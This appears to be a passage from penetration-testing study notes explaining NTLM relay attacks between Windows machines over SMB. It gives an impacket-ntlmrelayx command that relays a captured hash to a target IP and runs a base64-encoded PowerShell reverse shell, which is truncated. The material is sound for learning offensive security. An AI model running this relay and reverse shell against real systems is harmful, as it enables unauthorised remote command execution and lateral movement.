The idea now is to relay an NTLM info to another windows
service. We can do this when we gain access to a user account in a
machine, and we want to use its NTLM hash in another machine. If
the relayed authentication is from a user with local administrator
privileges, we can use it to authenticate and then execute
commands over SMB with methods similar to those used by psexec or
wmiexec.

We can perform this attack using ~ntlmrelayx~. Notice here is that
~-t~ refers to the target we're relaying the NTLM hash to, while ~-c~
is for the command to execute. In this case we're executing a
powershell reverse shell that was encoded in base64.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
